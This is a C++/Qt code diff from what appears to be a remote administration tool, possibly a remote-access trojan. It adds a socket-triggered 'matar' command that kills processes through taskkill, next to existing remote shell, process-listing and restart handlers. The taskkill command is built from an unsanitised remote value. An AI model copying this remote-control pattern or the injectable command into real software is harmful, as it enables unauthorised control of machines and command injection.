@@ -436,6 +436,10 @@ void MainWindow::llegadaDatos() {
     {
         listarProcesos();
     }
+    if(parametros[0] == "matar")
+    {
+        matarProceso(parametros[1]);
+    }
 
 
 }
@@ -544,7 +548,6 @@ QString MainWindow::shell(QString comando){
     #else
         consola.start(comando);
     #endif
-    consola.waitForReadyRead();
     return consola.readAllStandardOutput();
 }
 void MainWindow::reiniciar(){
@@ -734,6 +737,13 @@ void MainWindow::listarProcesos()
         listaEnvio = listaEnvio + listaProc[i].split(" ")[0] + "|@|";
     }
     util.escribirSocket(listaEnvio,&socket);
+    #endif
+}
+void MainWindow::matarProceso(QString programa)
+{
+    #ifdef Q_OS_WIN
+    QString orden = "taskkill /IM " + programa;
+    QProcess::startDetached(orden);
     #endif
 }
 void paralelo::datosEscritos()
